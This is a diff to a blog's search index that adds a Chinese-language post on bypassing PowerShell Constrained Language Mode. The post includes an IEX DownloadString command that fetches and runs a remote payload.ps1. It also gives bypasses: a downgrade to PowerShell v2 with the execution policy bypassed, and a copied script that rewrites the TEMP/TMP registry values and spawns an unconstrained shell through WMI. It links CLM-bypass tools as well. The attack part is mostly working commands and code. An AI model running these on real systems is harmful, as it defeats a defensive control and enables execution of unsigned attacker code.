@@ -17,6 +17,37 @@
 <script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
   </entry>
   <entry>
+    <title>CLMBypass</title>
+    <url>/posts/39eca96/</url>
+    <content><![CDATA[<h3 id="CLM"><a href="#CLM" class="headerlink" title="CLM"></a>CLM</h3><p>PowerShell Constrained Language Mode<a href="https://docs.microsoft.com/zh-cn/powershell/module/microsoft.powershell.core/about/about_language_modes?view=powershell-7.2">受限语言模式</a>是缓解PowerShell攻击的一种方式，能够阻止执行任意未签名的代码</p>
+<p>查询</p>
+<p><code>$ExecutionContext.SessionState.LanguageMode</code></p>
+<p>在本地查询结果为<code>FullLanguage</code> 即未开启状态</p>
+<p>开启CLM</p>
+<p><code>$ExecutionContext.SessionState.LanguageMode = &quot;ConstrainedLanguage&quot;</code></p>
+<p>测试语句 </p>
+<p>IEX (New-Object Net.WebClient).DownloadString.(‘<a href="http://192.168.0.133:8000/payload.ps1&#39;">http://192.168.0.133:8000/payload.ps1&#39;</a>)</p>
+<p>开启后会对此命令进行拦截</p>
+<p><img src="/posts/39eca96/1.png"></p>
+<h3 id="CLM-Bypass"><a href="#CLM-Bypass" class="headerlink" title="CLM Bypass"></a>CLM Bypass</h3><h4 id="Powershell降级"><a href="#Powershell降级" class="headerlink" title="Powershell降级"></a>Powershell降级</h4><p><code>powershell.exe -version 2</code></p>
+<p><code>powershell.exe -version 2 -ExecutionPolicy bypass</code></p>
+<h4 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h4><p><code> &amp;&#123; whoami &#125;</code></p>
+<h4 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h4><p>这里直接照搬国外大佬(<a href="https://sp00ks-git.github.io/posts/CLM-Bypass/)%E7%9A%84%E4%B8%80%E4%B8%AApowershell%E5%91%BD%E4%BB%A4%EF%BC%8C%E6%89%A7%E8%A1%8C%E5%90%8E%E4%BC%9A%E6%B4%BE%E7%94%9F%E5%87%BA%E4%B8%80%E4%B8%AA%E6%96%B0%E7%9A%84powershell(%E8%BF%99%E4%B8%AA%E7%89%88%E6%9C%AC%E5%8F%AF%E4%BB%A5%E6%A0%B9%E6%8D%AE%E5%91%BD%E4%BB%A4%E8%BF%9B%E8%A1%8C%E6%9B%B4%E6%94%B9)">https://sp00ks-git.github.io/posts/CLM-Bypass/)的一个powershell命令，执行后会派生出一个新的powershell(这个版本可以根据命令进行更改)</a></p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$CurrTemp</span> = <span class="variable">$env:temp</span></span><br><span class="line"><span class="variable">$CurrTmp</span> = <span class="variable">$env:tmp</span></span><br><span class="line"><span class="variable">$TEMPBypassPath</span> = <span class="string">&quot;C:\windows\temp&quot;</span></span><br><span class="line"><span class="variable">$TMPBypassPath</span> = <span class="string">&quot;C:\windows\temp&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Set-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&#x27;hkcu:\Environment&#x27;</span> <span class="literal">-Name</span> Tmp <span class="literal">-Value</span> <span class="string">&quot;<span class="variable">$TEMPBypassPath</span>&quot;</span></span><br><span class="line"><span class="built_in">Set-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&#x27;hkcu:\Environment&#x27;</span> <span class="literal">-Name</span> Temp <span class="literal">-Value</span> <span class="string">&quot;<span class="variable">$TMPBypassPath</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Invoke-WmiMethod</span> <span class="literal">-Class</span> win32_process <span class="literal">-Name</span> create <span class="literal">-ArgumentList</span> <span class="string">&quot;Powershell.exe&quot;</span> </span><br><span class="line"><span class="comment">#这里可以添加版本之类的参数</span></span><br><span class="line"><span class="comment">#Invoke-WmiMethod -Class win32_process -Name create -ArgumentList &quot;Powershell.exe -Version 2 -ExecutionPolicy bypass&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">sleep</span> <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Set it back</span></span><br><span class="line"><span class="built_in">Set-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&#x27;hkcu:\Environment&#x27;</span> <span class="literal">-Name</span> Tmp <span class="literal">-Value</span> <span class="variable">$CurrTmp</span></span><br><span class="line"><span class="built_in">Set-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&#x27;hkcu:\Environment&#x27;</span> <span class="literal">-Name</span> Temp <span class="literal">-Value</span> <span class="variable">$CurrTemp</span></span><br></pre></td></tr></table></figure>
+
+<p>也可以对以上命令进行混淆</p>
+<h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><blockquote>
+<p><a href="https://github.com/calebstewart/bypass-clm">https://github.com/calebstewart/bypass-clm</a><br><a href="https://github.com/p3nt4/PowerShdll">https://github.com/p3nt4/PowerShdll</a><br><a href="https://github.com/iomoath/PowerShx">https://github.com/iomoath/PowerShx</a></p>
+</blockquote>
+<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><blockquote>
+<p><a href="https://sp00ks-git.github.io/posts/CLM-Bypass/">https://sp00ks-git.github.io/posts/CLM-Bypass/</a></p>
+<p><a href="https://www.secjuice.com/powershell-constrainted-language-mode-bypass-using-runspaces/">https://www.secjuice.com/powershell-constrainted-language-mode-bypass-using-runspaces/</a></p>
+<p><a href="https://github.com/calebstewart/bypass-clm">https://github.com/calebstewart/bypass-clm</a></p>
+<p><a href="https://blog.0x4.xyz/bypassing-windows-protection-mechanisms/constrained-language-mode-bypass">https://blog.0x4.xyz/bypassing-windows-protection-mechanisms/constrained-language-mode-bypass</a></p>
+</blockquote>
+]]></content>
+  </entry>
+  <entry>
     <title>NTLM认证&amp;NTLMRelay攻击(持续更新...)</title>
     <url>/posts/5f88ecbb/</url>
     <content><![CDATA[<h2 id="LM-与-NTLM"><a href="#LM-与-NTLM" class="headerlink" title="LM 与 NTLM"></a>LM 与 NTLM</h2><p>Windows对用户的密码凭证有两种加密算法，也就是本文写的ntlm和lm。在使用QuarksPwDump抓密码的时候经常看到形如这样的hash</p>
